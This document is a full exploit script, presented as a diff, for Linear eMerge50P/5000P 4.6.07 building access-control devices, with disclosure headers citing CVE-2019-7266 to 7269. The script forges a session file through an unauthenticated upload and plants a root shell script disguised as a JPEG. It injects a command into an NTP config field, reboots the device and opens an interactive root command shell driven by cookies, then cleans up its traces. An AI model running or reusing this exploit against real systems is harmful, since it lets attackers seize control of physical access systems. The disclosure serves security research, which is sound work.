@@ -1,0 +1,278 @@
+# Exploit Title: eMerge50P 5000P 4.6.07 - Remote Code Execution
+# Google Dork: NA
+# Date: 2018-11-11
+# Exploit Author: LiquidWorm
+# Vendor Homepage: http://linear-solutions.com/nsc_family/e3-series/
+# Software Link: http://linear-solutions.com/nsc_family/e3-series/
+# Version: 4.6.07
+# Tested on: NA
+# CVE : CVE-2019-7269
+# Advisory: https://applied-risk.com/resources/ar-2019-009
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+# Advisory: https://applied-risk.com/resources/ar-2019-005
+
+# PoC:
+#!/bin/bash
+#
+# Full remote code execution exploit for the Linear eMerge50P/5000P 4.6.07
+# Including escalating to root privileges
+# CVE: CVE-2019-7266, CVE-2019-7267, CVE-2019-7268, CVE-2019-7269
+# Advisory: https://applied-risk.com/resources/ar-2019-006
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+# 
+# This script is tested on macOS 10.13.6
+# by Sipke Mellema
+#
+# usage: ./sploit.sh http://target
+#
+##########################################################################
+#
+# $ ./sploit.sh http://192.168.1.1
+#
+#
+#	   .         .         .         .         .
+#	 .          .         .          .          . 
+#	|          |Linear eMerge50 4.6.07|          |
+#	|          |                      |          |
+#	|          |Remote code executionz|          |
+#	|          | With priv escalation |          |
+#	|          |    Get yours today   |          |
+#	|          |          |           |          |
+#	|          |        Boomch        |          |
+#	 .          .         .          .          . 
+#	      .        .        .        .        . 
+#
+#
+#
+# [*] Checking connection to the target..
+# [V] We can connect to the server
+# [*] Checking if already infected..
+# [V] Target not yet infected..
+# [*] Creating custom session file..
+# [*] Uploading custom session file..
+# [V] Session file active!
+# [*] Retrieving CSRF token..
+# [V] CSRF_TOKEN: AI1R5ebMTZXL8Vu6RyhcTuavuaEbZvy9
+# [*] Uploading file..
+# [V] File successfully uploaded
+# [*] Writing new config..
+# [V] Wrote new config, restarting device
+# [*] Looks good! Waiting for device to reboot..
+# [V] Executing: whoami..
+# [V] Username found: root
+# [*] Cleaning up uploaded files..
+# [*] Removing fake backup file..
+# [*] Removing shell script..
+# [*] Files removed
+#
+# [*] If that worked, you can how execute commands via your cookie
+# [*] The URL is: http://192.168.1.1/cgi-bin/websrunnings.cgi
+# [*] Or type commands below ('quit' to quit)
+#
+# root@http://192.168.1.1$ id
+# uid=0(root) gid=0(root) groups=0(root)
+# root@http://192.168.1.1$ quit
+#
+##########################################################################
+
+RED='\033[0;31m'; BLUE='\033[0;34m'; GREEN='\033[0;32m'; NC='\033[0m'
+BANNER="
+\t   .         .         .         .         .
+\t .          .         .          .          . 
+\t|          |${BLUE}Linear eMerge50 4.6.07${RED}|          |
+\t|          |${BLUE}                      ${RED}|          |
+\t|          |${BLUE}Remote code executionz${RED}|          |
+\t|          |${BLUE} With priv escalation ${RED}|          |
+\t|          |${BLUE}    Get yours today   ${RED}|          |
+\t|          |${BLUE}          |           ${RED}|          |
+\t|          |${BLUE}        Boomch        ${RED}|          |
+\t .          .         .          .          . 
+\t      .        .        .        .        . 
+${NC}
+"
+printf "\n${RED}${BANNER}\n\n"
+
+function echo_green {
+  printf "${GREEN}[*] $@${NC}\n"
+}
+function echo_blue  { 
+  printf "${BLUE}[V] $@${NC}\n" 
+}
+function echo_red   { 
+  printf "${RED}[-] $@${NC}\n"  
+}
+
+function show_usage {
+  echo -en "Usage: ./sploit.sh
+"
+}
+
+
+# check arguments
+if [ $# -eq 0 ]
+  then
+    echo_red "Incorrect parameters"
+    show_usage
+    exit
+fi
+
+
+# Define global paramters
+VULN_HOST=$1
+TEST_CMD="whoami"
+
+# ========================= Vuln 2: Session ID allows path traversal
+# Path traversal to session file injected as backup file
+SESSION_ID="../web/upload/system/backup.upg"
+
+
+function run_remote_shell {
+  # shell is in the context of the lower privileged user called s2user
+  # but the user has sudo rights
+  # ========================= Vuln 5: Webserver runs as root
+  TEST_CMD=''
+  while read -p "${SPLOT_USERNAME}@${VULN_HOST}$ " TEST_CMD && [ "${TEST_CMD}" != "quit" ] ; do
+    curl -s -k -H "Cookie: sudo $TEST_CMD" ${VULN_HOST}/cgi-bin/websrunnings.cgi
+    echo ""
+  done
+}
+
+# ========================= Pre-exploit checks
+
+# check connection
+echo_green "Checking connection to the target.."
+RESULT=`curl -sL -w "%{http_code}\\n" ${VULN_HOST} -o /dev/null --connect-timeout 3 --max-time 5`
+if [ "$RESULT" != "200" ] ; 
+then
+   echo_red "Could not connect to ${VULN_HOST} :(" ;
+   exit
+fi
+echo_blue "We can connect to the server"
+
+# check already infected
+echo_green "Checking if already infected.."
+RESULT=`curl -sL -w "%{http_code}\\n" ${VULN_HOST}/cgi-bin/websrunnings.cgi -o /dev/null --connect-timeout 3 --max-time 5`
+if [ "$RESULT" == "200" ] ; then
+   echo_blue "Target already seems to be infected"
+   SPLOT_USERNAME=`curl -s -k -H "Cookie: sudo whoami" ${VULN_HOST}/cgi-bin/websrunnings.cgi`
+   echo_blue "Username found: ${SPLOT_USERNAME}"
+   read -p "Try shell directly? (Y/N)" TEST
+   if [ "$TEST" == "Y" ] ; then
+      echo_green "Trying direct shell.."
+      run_remote_shell
+      exit
+    fi
+else
+   echo_blue "Target not yet infected.." ;
+fi
+
+
+
+# ========================= Vuln 1: Sys update CGI script allows unauthenticated upg-file upload
+# Used to create file with the contents of a valid session file
+# Session file required a timestamp from < 3600 seconds ago
+# And a valid (remote) IP address
+
+echo_green "Creating custom session file.."
+# binary session file
+SESS_FILE_BIN_PRE="MzEzMzc4MDA4NQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABTeXN0ZW0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEFkbWluaXN0cmF0b3IAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYWRtaW4AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
+SESS_FILE_BIN_POST="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAQAAAAEAAAABAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQUkxUjVlYk1UWlhMOFZ1NlJ5aGNUdWF2dWFFYlp2eTkAAAAAYtPxW0o/71s="
+# write session/backup file
+printf $SESS_FILE_BIN_PRE | base64 -D > backup.upg
+# write IP
+MY_IP=`curl -s https://api.ipify.org`
+printf ${MY_IP} >> backup.upg
+printf $SESS_FILE_BIN_POST | base64 -D >> backup.upg
+# replace timestamp
+python -c "import struct,time,sys; sys.stdout.write(struct.pack('<i',int(time.time()+(3600*5))))" | dd of=backup.upg bs=1 seek=1080 count=4 conv=notrunc 2> /dev/null
+# upload session as backup file
+echo_green "Uploading custom session file.."
+curl -s -F upload=@backup.upg ${VULN_HOST}/cgi-bin/uplsysupdate.cgi
+
+# check if session file works
+RESULT=`curl -s -w "%{http_code}\\n" --cookie ".sessionId=$SESSION_ID" ${VULN_HOST}/goform/foo -o /dev/null --connect-timeout 3 --max-time 5`
+if [ "$RESULT" != "200" ] ; then
+   echo_red "Creating session file didn't seem to work :(" ;
+   exit
+fi
+echo_blue "Session file active!"
+
+
+
+# ========================= Vuln 3: Image upload allows any file contents
+# We use it to upload a shell script
+# It will be run as root on startup
+
+# get csrf token
+echo_green "Retrieving CSRF token.."
+CSRF_TOKEN=`curl -s --cookie ".sessionId=$SESSION_ID" ${VULN_HOST}/frameset/ | grep -E -o 'csrft           = "(.*)"' | awk -F '"' '{print $2}'`
+echo_blue "CSRF_TOKEN: $CSRF_TOKEN"
+
+if [ -z "$CSRF_TOKEN" ]; then
+  echo_red "Could not get CSRF token :("
+  exit
+fi
+
+# prepare file
+# this will run as root
+echo "cp /usr/local/s2/web/cgi-bin/websrunning.cgi /usr/local/s2/web/cgi-bin/websrunnings.cgi" > shell.jpg
+echo 'sed -i '"'"'s/echo "OK"/A=\`\$HTTP_COOKIE\`;printf "\$A"/'"'"' /usr/local/s2/web/cgi-bin/websrunnings.cgi' >> shell.jpg
+
+# upload file
+echo_green "Uploading file.."
+RESULT=`curl -s --cookie ".sessionId=$SESSION_ID" \
+  -F "csrft=$CSRF_TOKEN" \
+  -F "person=31337" \
+  -F "file=@shell.jpg" \
+  ${VULN_HOST}/person/upload/ | grep -o "File successfully uploaded"`
+echo_blue $RESULT
+
+if [[ ! "$RESULT" =~ "successfully" ]]; then
+  echo_red "Could not upload file :("
+  exit
+fi
+
+
+
+# ========================= Vuln 4: Config allows command injection
+# Length is limited
+# Also, no spaces allowed
+
+# change config
+# the file in the config file will be run as root at startup
+echo_green "Writing new config.."
+curl -s ${VULN_HOST}/goform/saveS2ConfVals --cookie ".sessionId=$SESSION_ID" --data "timeserver1=a.a%24%28bash%3C%2Fusr%2Flocal%2Fs2%2Fweb%2Fupload%2Fpics%2Fshell.jpg%29&timeserver2=&timeserver3=&timezone=America%2FChicago&save=Save&urlOk=cfgntp.asp&urlError=cfgntp.asp&okpage=cfgntp.asp" > /dev/null
+echo_blue "Wrote new config, restarting device"
+
+# restart device
+RESULT=`curl -s --cookie ".sessionId=$SESSION_ID" ${VULN_HOST}/goform/restarts2Conf --data "changeNetwork=1" | grep -o "The proxy server could not handle the request"`
+# this is supposed to get returned (device rebooting)
+if [[ "$RESULT" =~ "could not handle the request" ]]; then
+  echo_green "Looks good! Waiting for device to reboot.."
+  sleep 20
+  echo_blue "Executing: whoami.."
+  SPLOT_USERNAME=`curl -s -k -H "Cookie: sudo whoami" ${VULN_HOST}/cgi-bin/websrunnings.cgi`
+  echo_blue "Username found: ${SPLOT_USERNAME}"
+
+  # cleanup
+  echo_green "Cleaning up uploaded files.."
+  echo_green "Removing fake backup file.."
+  RESULT=`curl -s -k -H "Cookie: sudo rm /usr/local/s2/web/upload/system/backup.upg" ${VULN_HOST}/cgi-bin/websrunnings.cgi`
+  echo_green "Removing shell script.."
+  RESULT=`curl -s -k -H "Cookie: sudo rm /usr/local/s2/web/upload/pics/shell.jpg" ${VULN_HOST}/cgi-bin/websrunnings.cgi`
+  echo_green "Files removed"
+
+  # start shell
+  echo ""
+  echo_green "If that worked, you can now execute commands via your cookie"
+  echo_green "The URL is: ${VULN_HOST}/cgi-bin/websrunnings.cgi"
+  echo_green "Or type commands below ('quit' to quit)"
+  echo ""
+
+  run_remote_shell
+
+else
+    echo_red "Exploit failed :("
+fi
+
+exit
